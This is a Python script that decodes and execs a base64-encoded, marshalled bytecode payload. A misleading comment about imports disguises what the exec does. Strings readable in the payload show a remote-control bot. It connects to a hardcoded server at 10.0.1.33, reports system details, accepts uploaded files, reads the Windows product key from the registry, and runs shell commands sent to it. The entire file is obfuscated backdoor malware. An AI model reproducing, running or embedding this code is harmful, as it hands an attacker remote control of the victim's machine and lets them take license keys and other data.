import marshal, base64

def run_encrypted():
    data = base64.b64decode('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')
    code = marshal.loads(data)
    exec(code, globals())  # Use globals so imports like argparse work properly

if __name__ == '__main__':
    run_encrypted()
